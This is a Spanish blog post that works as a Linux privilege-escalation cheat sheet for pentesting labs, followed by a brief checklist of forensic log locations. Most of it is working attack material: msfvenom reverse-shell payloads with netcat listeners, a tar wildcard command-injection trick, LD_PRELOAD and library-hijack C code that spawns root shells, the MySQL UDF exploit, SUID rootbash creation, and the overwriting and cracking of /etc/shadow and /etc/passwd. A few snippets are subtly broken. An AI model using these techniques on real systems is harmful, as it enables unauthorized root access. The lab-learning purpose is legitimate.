---
layout: post
author: Sergio Salgado
---

## [](#header-2)Indice
- <a href="#introduccion">Introduccion</a>
- <a href="#reconocimiento">Reconocimiento</a>
- <a href="#enumeracion">Enumeracion</a>
- <a href="#explotacion">Explotacion</a>
- <a href="#hardening">Hardening</a>

## [](#header-2)<a id="introduccion">Introduccion</a>
Un analisis de vulnerabilidades exitoso consiste en desarrollar una metodologia util para su ejecucion, en este post el objetivo es plasmar las herramientas vistas en el Libro Hacking Exposed Windows; a su vez actualizare la manera que se puede usar las herramientas desde kali Linux 2022 y tambien poner en que maquinas se ha utilizado en HtB para poder ejemplificar de manera correcta dichas acciones.
Herramientas automatizadas para la enumeracion: 
<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas</a>
<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>
<a href="https://github.com/The-Z-Labs/linux-exploit-suggester">LES(Linux Exploit Suggester)</a>
<a href="https://github.com/sleventyeleven/linuxprivchecker">Linux Priv Checker</a>

## [](#header-2)Common Linux Enumeration
Podemos usar el siguiente comando para obtener el nombre del sistema, normalmente esto nos puede indicar el rol que cumple el objetivo(Servidor de Base de datos, proxy, respaldo, etc.).
```s
hostname
```

El siguiente comando nos imprimira informacion del sistema, como informacion a cerca del kernel usado por el sistema. Esto es util al buscar vulnerabilidades a nivel de kernel.
```s
uname -a
```

El archivo de sistema /proc/version nos traera informacion sobre los procesos del sistema, en diferentes versiones de linux se encuentra y sera util incluirlo en el arsenal. Ademas de poder ver la informacion del kernel del sistema, podremos ver compiladores del sistema, como gcc.
```s
cat /proc/version
```

El archivo /etc/issue nos traera informacion relevante para entender el sistema, a pesar de que puede ser modificado facilmente es buena idea revisar este archivo siempre.
```s
cat /etc/issue
```

El comando ps, nos traera informacion sobre los procesos de la shell actual
```s
#Para ver todos los procesos
ps -A

#Para ver el arbol de procesos
ps axjf

#Para ver los procesos de todos los usuarios, este es con el que podemos extraer mas informacion
ps aux
```

Para ver todas las variables de entorno, potemos usar el comando env. La variable PATH, podria tener un compilador que pueda ser usada para ejecutar codigo en el sistema y poder escalar privilegios.
```s
env
```

El sistema podria estar configurado para permitir que los usuarios puedan ejecutar comandos sin permisos de administrados y el comando siguiente listara los comandos que se podrian usar.
```s
sudo -l
```

Siempre que se use el comando ls, deberia usarse con las flags -la para que no se nos escape nada
```s
ls -la
```

El comando id nos podra listar mas informacion sobre el usuario actual, como sus privilegios, grupos de pertenencia.Tambien puede ser usado para tener la informacion de otro usuario.
```s
id
id frank
```

En el archivo /etc/passwd podemos encontrar informacion sobre los usaurios, pero para cortar los resultados podemos usar los comandos siguientes.
*Hay que recordar que con el 2do comando la lista que tendremos son usuarios de servicio o de sistema*
```s
cat /etc/passwd | grep sh$
cat /etc/passwd | cut -d ":" -f 1
```

```s
history
```

```s
ifconfig
```

```s
ip route
```

```s
netstat
#Nos mostrara todos los puertos de escucha y conecciones establecidas
netstat -a
#Para listar los protocolos UDP o TCP
netstat -at || netstat -au
#Para listar los puertos en modo listening y se puede combinar con la t o u para filtrar por protocolos
netstat -l || netstat -lt || netstat -lu
#Para listar estadisticas de protocolo, tambien puede combinarse con t y u
netstat -s
#Para listar conecciones junto con su proceso, y tambien se puede combinar con l para filtrar por puertos en escucha
netstat -tp
#Comunmente se usa el siguiente. -a Para traer todos los sockets, -n para la resolucion de nombres, -o para los tiempos
netstat -ano
```

Ahora mi favorito, pero un poco invasivo/tardado a veces es
```s
#Para encontrar el archivo por nombre desde el directorio actual
find . -name flag1.txt 2>/dev/null
#Para encontrar el archivo por nombre desde el directorio /home
find /home -name flag1.txt  2>/dev/null
#Para encontrar el directorio con nombre config, desde /
find / -type d -name config 2>/dev/null
#Para encontrar archivos con todos los permisos para todos los usuarios o bien permisos 777
find / -type f -perm 0777 2>/dev/null
#Para encontrar archivos ejecutables
find / -perm a=x -type f 2>/dev/null
#Para encontrar todos los archivos para el usuario frank debajo de home
find /home -user frank  2>/dev/null
#Encuentra archivos que fueron modificados en los ultimos 10 dias
find / -mtime 10  2>/dev/null
#Encuentra archivos que fueron accedidos en los ultimos 10 dias
find / -atime 10  2>/dev/null
#Encuentra archivos que fueron cambiados en los ultimos 60 minutos
find / -cmin 60  2>/dev/null
#Encuentra archivos que fueron accedidos en los ultimos 60 minutos
find / -amin 60  2>/dev/null
#Encuentra archivos que tengan de tamano 50 MB
find / -size 50M 2>/dev/null
#Encontrar folders que se pueden escribir o ejecutar
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
#Encontrar herramientas de desarrollo y lenguajes disponibles
find . -name perl* 2>/dev/null
find . -name python* 2>/dev/null
find . -name gcc* 2>/dev/null
```

Podemos obtener las capacidades con
```s
getcap -r / 2>/dev/null
```

## [](#header-2)Common Linux Privesc
En este apartado, nos centraremos en explotar lainformacion que se colecta a travez de la herramienta LinEnum.sh, que se puede encontrar en el siguiente <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">link</a>.
Como traernos este script a la maquina victima? Podemos intentar traerlo de 2 maneras, la primera es levantando un servidor http con python con el comando siguiente:
```s
python3 -m http.server 8000
```
Despues en la maquina victima solo tendremos que traernos el archivo con un wget.

Y la segunda, copiando el script y pegandolo en un archivo editado con nano o vi.

Despues solo tendremos que cambiar los permisos del archivo con un:
```s
chmod +x
```

### [](#header-3)Finding and Exploiting SUID Files
Para encontrar SUID files, podemos usar el comando que se utiliza en la herramienta LinEnum, que es el siguiente:
```s
find / -perm -u=s -type f 2>/dev/null
```
#### [](#header-4)Exploiting a writable /etc/passwd
Realmente es simple, si tenemos un archivo /etc/passwd grabable, podemos escribir una nueva entrada de línea de acuerdo con la fórmula anterior y crear un nuevo usuario.
Primero necesitamos una contrasena con el formato correcto y para esto, podemos usar el comando:
```s
openssl passwd -1 -salt [salt] [password]
```
#### [](#header-4)Escaping Vi Editor
Siempre que tenemos acceso al sistema, es buena idea ejecutar el comando 
```s
sudo -l
```
En este ejemplo, si nuestro usuario tiene permiso de ejecutar vi como administrador, sera posible abrir una shell con solamente ejecutar en las opciones:
```s
sudo vi
#Despues solo usamos las opciones
:!sh
```
Y vuala, nuestra shell con el usuario root estara disponible
#### [](#header-4) Exploiting Crontab
Esta tecnica consiste en tomar control de un archivo que se ejecute en el sistema en el cual tengamos permisos de escritura sobre este mismo.
Para encontrar los archivos que se ejecutan en automatico, podemos usar:
```s
cat /etc/crontab
```
En este ejemplo, agregaremos al archivo que se ejecuta automaticamente la salida del payload generado con el comando:
```s
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```
En la maquina atacante solo tendremos que ejecutar:
```s
nc -lvnp 8888
```
#### [](#header-4) Exploiting PATH Variable 
Esta tecnica consiste en explotar la variable de entorno del PATH, la cual se puede visualizar con el comando:
```s
echo $PATH
```
Para este ejemplo, realizaremos los pasos siguientes:
1. Cambiarnos al directorio /tmp o a alguno con permisos de escritura.
```s
find / -writable 2>/dev/null
```
2. Crear un archivo llamado "ls"
```s
touch ls
```
3. Escribir dentro del archivo el comando que ejecutaremos, el cual sera:
```s
echo "/bin/bash" > ls
```
4. Le asignamos permisos de ejecusion al archivo con:
```s
chmod +x ls
```
5. Integramos al PATH la carpeta de /tmp con:
```s
export PATH=/tmp:$PATH
```
6. Ejecutamos "ls" y tendremos nuestra shell con el usuario root.
## [](#header-2)Linux PrivEsc
### [](#header-3)Service Exploits
El ejemplo para esta explotacion, es el servicio de MySQL. Para explotarlo necesitamos usar los comandos siguientes:
Primero descargamos un <a href="https://www.exploit-db.com/exploits/1518">exploit</a> popular.
Navegamos al path del exploit y lo compilamos con
```s
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Iniciamos sesion en el servicio de Mysql
```s
mysql -u root
```
Ejecutamos los siguientes comandos para crear un usuario que actue sobre el sistema
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
Hacemos una copia de /bin/bash a /tmp/rootbash
```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Y finalmente, para ejecutar nuestra shell con permisos de administrador ejecutamos:
```s
/tmp/rootbash -p
```
*NOTA* Para dejar todo como estaba, solo tendremos que eliminar el archivo /tmp/rootbash
### [](#header-3)Weak File Permissions - Readable /etc/shadow
Para este caso, lo que se tiene que hacer es aplicar una fuerza bruta sobre el hash de contrasena del usuario que tenemos como objetivo, esto se logra con el hash que se encuentra en el archivo /etc/shadow, entre el primer y segundo ":". 
Copiaremos el hash en un archivo llamado hash.txt y aplicamos el comando
```s
john --wordlist=/usr/share/wordlist/rockyou.txt
```
Y tendremos crackeada la contrasena.
### [](#header-3)Weak File Permissions - Writable /etc/shadow 
Para este caso, consiste en generar una contrasena en el formato apropiado y pasarlo al archivo /etc/shadow.
1. Generamos la nueva contrasena con
```s
mkpasswd -m sha-512 newpasswordhere
```
2. Cambiamos la clave del usuario que queremos por la que generamos en el paso anterior
3. Iniciamos sesion en la cuenta del usuario y ponemos la nueva contrasena para acceder.

### [](#header-3)Weak File Permissions - Writable /etc/passwd
Este caso consiste en generar una contrasena en el formato apropiado para el archivo /etc/password.
1. Generamos la contrasena nueva con
```s
openssl passwd newpasswordhere
```
2. Cambiamos la clave del usuario, por la que acabamos de generar, que esta representada por una x
3. Podremos cambiar de usuario y usar la nueva contrasena.

### [](#header-3)Sudo - Shell Escape Sequences 
Mediante los programas listados con el comando
```s
sudo -l
```
Podemos visitar la <a href="https://gtfobins.github.io/">pagina</a> y tratar de ganar una shell de root.

### [](#header-3)Sudo - Environment Variables
En esta seccion jugaremos con las variables de entorno de librerias y de aplicaciones binarias. Se explicara un ejemplo de cada uno.
Para la primera practica, necesitamos hacer un archivo llamado preload.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
Con el programa anterior, generaremos un objeto compartido con los comandos:

```s
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Ahora tomaremos uno de los programas que tenemos permitidos usar con sudo, en el siguiente comando:
```s
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
Y tendremos nuestra shell de root.

En este ejemplo, usaremos las librerias de apache2. Para listar las librerias que usa, usamos el comando:
```s
ldd /usr/sbin/apache2
```

El segundo programa se llamara library_path.c
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
Con el programa anterior, crearemos igualmente un objeto compartido de la manera siguiente:
```s
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Y ahora ejecutaremos
```s
sudo LD_LIBRARY_PATH=/tmp apache2
```

### [](#header-3)Cron Jobs - File Permissions 
Esta tecnica consiste en tomar control de un archivo que se ejecute en el sistema en el cual tengamos permisos de escritura sobre este mismo.
Para encontrar los archivos que se ejecutan en automatico, podemos usar:
```s
cat /etc/crontab
```
En este ejemplo, agregaremos al archivo que se ejecuta automaticamente la salida del payload generado con el comando:
```s
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```
En la maquina atacante solo tendremos que ejecutar:
```s
nc -lvnp 8888
```
### [](#header-3)Cron Jobs - PATH Environment Variable
Esta tecnica consiste en abusar del PATH donde se ejecutan los archivos, haciendo el cat /etc/crontab podemos ver el path y usar el que este antes para que se resuelva la ejecusion a nuestro control.
Creamos un archivo con el mismo nombre, con el siguiente codigo
```s
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Le damos permisos de ejecusion
```s
chmod +x /home/user/overwrite.sh
```
Ejecutamos nuestra shell de root con
```s
/tmp/rootbash -p
```
### [](#header-3)Cron Jobs - Wildcards 
En este ejemplo tomaremos como ejemplo una wild card que se usa comunmente con el comando tar en los cronjobs.
Consiste en ejecutar comandos de tar con los mismos nombres de los archivos. Y se logra de la manera siguiente:
Primero, haremos un payload con el comando:
```s
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
Despues lo colocaremos en el directorio adecuado y le asignamos permisos de ejecusion, y crearemos otros dos archivos con:
```s
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
Esperamos la conexion y vuala
```s
nc -nvlp 4444
```
### [](#header-3)SUID / SGID Executables - Known Exploits 
Como en el caso anterior, usaremos un comando para mapear los ejecutables con permisos de root.
```s
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Encontrar archivos dentro de una carpeta
```s
find /home/pwn -type f -readable -ls 2>/dev/null
```
Para encontrar los explots, es buena idea buscar en google, exploitdb y github.

### [](#header-3)SUID / SGID Executables - Shared Object Injection
En este caso, probaremos la vulnerabilidad en el ejecutable del archivo SUID. Que se encuentra en "/usr/local/bin/suid-so",insertando esta ruta ejecutaremos el archivo.

Para visualizar las librerias que hacen falta de instalar, podemos usar el comando
```s
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
Creamos la ruta que hace falta.
Creamos la libreria falsa con el codigo siguiente
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void hijack() {
	setuid(0);
	system("/bin/bash -p");
}
```
Compilamos el archivo como objeto compartido con
```s
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
Ejecutamos ahora el archivo de suid y tendremos nuestra shell.

### [](#header-3)SUID / SGID Executables - Environment Variables
### [](#header-3)SUID / SGID Executables - Abusing Shell Features (#1)
### [](#header-3)Passwords & Keys - History Files 
### [](#header-3)Passwords & Keys - Config Files 
### [](#header-3)Passwords & Keys - SSH Keys 
### [](#header-3)NFS
La configuracion del Network File Sharing se encuentra en /etc/exports, se crea con la instalacion de NFS y normalmente puede ser leido por todos los usuarios
El elemento de vector critico es la opcion "no_root_squash" Que por default, NFS cambia el usuario root a nfsnobody y deja el archivo operando con permisos de root. Si esta opcion esta presente en un archivo de escritura compartido, podemos crear un ejecutable con SUID y correrlo en el sistema.
```s
cat /etc/exports | grep no_root_squash
```
Para enumerar montables compartidos
```s
showmount -e 10.0.2.12
```
Vamos a montar uno de nuestros compartidos "no_root_squash" a nuestra maquina atacante y empezar a hacer nuestro ejecutable
```s
mkdir /tmp/backupsonattackermachine

mount -o rw 10.0.2.12:/backups /tmp/backupsonattackermachine
```
Un simple ejecutable que nos permita usar /bin/bash

```s
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0
}
```

Ahora compilaremos el archivo
```s
gcc nfs.c -o nfs -w

chmod +s nfs

ls -l nfs
```
### [](#header-3)Kernel Exploits
La metodolgia es sencilla, solamente hay que:
	1. Identificar la version de kernel
	2. Buscar un exploit para la version de el kernel.
	3. Ejecutar el exploit.
`Podemos buscar estos exploits en Google, recursos como`<a href="https://www.linuxkernelcves.com/cves">la pagina</a>` y la ultima alternativa es LES aunque pueda generar falsos positivos`
*Hay que recordar que un mal exploit de kernel puede ahcer que el sistema crashee y afecte a la prueba de penetracion*
### [](#header-3)Privilege Escalation Scripts 

## [](#header-2)FORENSCIS LINUX (LOGS IMPORTANTES)

Archivos importantes a revisar DENTRO DE UN SISTEMA LINUX:

### [](#header-3)SISTEMA OPERATIVO E INFORMACION DE CUENTAS

#### [](#header-4)Información del sistema Operativo
Revisar la carpeta:
```s
/etc/os-release
```
#### [](#header-4)Información de Cuentas de Usuario
Revisar la carpeta:
```s
/etc/passwd
```
A mi me gusta usarlo con
```s
cat /etc/passwd | grep sh$
```

#### [](#header-4)Información de de grupos 
```s
/etc/group
```

#### [](#header-4)Lista de usuarios administradores
```s
/etc/sudoers
```
#### [](#header-4)Información de loggeo
```s
sudo last -f /var/log/wtmp
```

#### [](#header-4)Logs de autenticación
 ```s
cat /var/log/auth.log | tail
```
### [](#header-3)CONFIGURACION DEL SISTEM
#### [](#header-4)Hostnames
```s
/etc/hostname
```
#### [](#header-4)Timezone
```s
/etc/timezone
```
#### [](#header-4)Network Configuration
```s
/etc/network/interfaces
```
#### [](#header-4)Conexiones activas de red
```s
netstat -natp
```
#### [](#header-4)Procesos Corriendo
```s
ps aux
```
#### [](#header-4)Información de DNS
```s
/etc/hosts
/etc/resolv.conf
```
### [](#header-3)MECANISMOS DE PERSISTENCIA
#### [](#header-4)Cron jobs

```s
/etc/crontab
```
para editarlo crontab -e
#### [](#header-4)Service Startup
```s
ls /etc/init.d/
```
Directorio .Bashrc
```s
cat ~/.bashrc
/etc/bash.bashrc /etc/profile
```
### [](#header-3)EVIDENCIA DE EJECUSION
#### [](#header-4)Historial de Ejecusion de SUDO
```s
cat /var/log/auth.log* | grep -i COMMAND|tail
```
#### [](#header-4)Historial del Bash
```s
cat ~/.bash_history
```
#### [](#header-4)Archivos accesados usando vim
```s
cat ~/.viminfo
```
### [](#header-3)ARCHIVOS DE LOG

#### [](#header-4)Syslog
```s
/var/log/syslog
```
#### [](#header-4)Auth logs
```s
/var/log/auth.log
```

#### [](#header-4)Python en el sistema
```py
import os
os.setuid(0)
os.system("/bin/bash")
```
